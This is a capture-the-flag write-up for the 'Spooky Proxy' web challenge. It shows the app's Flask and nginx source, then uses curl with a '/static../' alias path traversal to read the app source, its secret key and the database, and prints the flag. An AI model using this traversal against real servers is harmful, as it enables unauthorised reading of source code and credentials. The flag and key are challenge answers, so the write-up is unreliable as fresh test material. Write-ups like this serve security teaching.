# Spooky Proxy

## Description

I just learned how to build a proxy. Hope nothing is wrong with my application!

[SpookyProxy.zip](https://ctf.uscybergames.com/files/d78ebc586acaa1d26071d2b0ec86e5be/SpookyProxy.zip?token=eyJ1c2VyX2lkIjoxMDY4LCJ0ZWFtX2lkIjpudWxsLCJmaWxlX2lkIjo3fQ.aEmLwA.sOs6Q6xK-VfjGpReY3NMaeOzd-g)

## Solution

Very basic logic/register form

![Spooky_Proxy.png](/assets/ctf/uscybergames/spooky_proxy.png)

Register and login. The page is again very plain without anything much. We were given session cookie tho.

![Spooky_Proxy-1.png](/assets/ctf/uscybergames/spooky_proxy-1.png)

Session looks like a Flask Cookie, decode:
```bash
└─$ flask-unsign -c 'eyJ1c2VybmFtZSI6InRlc3QwMiJ9.aEmMsA.yZkbzMgRXP0MTpiRxH-YuGrNiBs' -d
{'username': 'test02'}
```

`app.py`:
```python
from flask import Flask, render_template, request, redirect, session, g
from werkzeug.security import generate_password_hash, check_password_hash
import sqlite3

app = Flask(__name__)
app.secret_key = 'REDACTED'

DATABASE = 'challenge.db'

def get_db():
    db = getattr(g, '_database', None)
    if db is None:
        db = g._database = sqlite3.connect(DATABASE)
        db.row_factory = sqlite3.Row
    return db

@app.teardown_appcontext
def close_connection(exception):
    db = getattr(g, '_database', None)
    if db is not None:
        db.close()

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        pw_hash = generate_password_hash(password)

        db = get_db()
        cur = db.cursor()
        try:
            cur.execute("INSERT INTO users (username, password) VALUES (?, ?)", (username, pw_hash))
            db.commit()
            return redirect('/login')
        except sqlite3.IntegrityError:
            return "Username already taken."

    return render_template('register.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        cursor = get_db().cursor()

        cursor.execute("SELECT * FROM users WHERE username = ?", (username,))
        user = cursor.fetchone()

        if user and check_password_hash(user['password'], password):
            session['username'] = user['username']
            return redirect('/dashboard')
        else:
            return "Invalid credentials."

    return render_template('login.html')

@app.route('/dashboard')
def dashboard():
    if 'username' not in session:
        return redirect('/login')

    username = session['username']
    cursor = get_db().cursor()

    if username == 'admin':
        cursor.execute("SELECT flag FROM flags")
        flag = cursor.fetchone()['flag']
        return render_template('dashboard.html', username=username, flag=flag)

    return render_template('dashboard.html', username=username, flag=None)

if __name__ == '__main__':
    app.run(debug=False)
```

Application seems safe and sound, we get the Flag if we are user called `admin` (user already exists so we can't create it).

Nginx is used to serve the application: `proxy.conf`
```yaml
server {
    listen 80;
    server_name localhost;
    
    add_header X-Frame-Options "SAMEORIGIN" always;
    add_header X-XSS-Protection "1; mode=block" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header Referrer-Policy "strict-origin-when-cross-origin" always;
    
    client_max_body_size 10M;
    
    proxy_connect_timeout 60s;
    proxy_send_timeout 60s;
    proxy_read_timeout 60s;
    
    location /static {
        alias /var/www/static/;
        expires 1d;
        add_header Cache-Control "public, immutable";
    }
    
    location ~* /(register|login)$ {
        limit_req zone=login_limit burst=10 nodelay;
        proxy_pass http://127.0.0.1:5000;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_buffering off;
        proxy_cache off;
    }
    
    location = / {
        return 302 /login;
    }
    
    location / {
        proxy_pass http://127.0.0.1:5000;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        
        proxy_buffering off;
        proxy_cache off;
    }
}
```

`location` block is very sussy, evaluate with: [https://www.getpagespeed.com/check-nginx-config](https://www.getpagespeed.com/check-nginx-config)

![Spooky_Proxy-2.png](/assets/ctf/uscybergames/spooky_proxy-2.png)

[https://github.com/dvershinin/gixy/blob/master/docs/en/plugins/aliastraversal.md](https://github.com/dvershinin/gixy/blob/master/docs/en/plugins/aliastraversal.md)

LFI works, we know the directory names from Dockerfile
```powershell
➜ curl https://lyyyonqc.web.ctf.uscybergames.com//static../source/app.py
from flask import Flask, render_template, request, redirect, session, g
from werkzeug.security import generate_password_hash, check_password_hash
import sqlite3

app = Flask(__name__)
app.secret_key = '$SuperS3cr3tK3Y!!!!'
...
```

```bash
➜ curl https://lyyyonqc.web.ctf.uscybergames.com//static../html/challenge.db -so- | strings | sls SVBGR

oSVBGR{wh00ps_1_f0rg0t_4_sl4sh_1n_my_ng1nx_c0nf1g}
```

::: tip Flag
`SVBGR{wh00ps_1_f0rg0t_4_sl4sh_1n_my_ng1nx_c0nf1g}`
:::

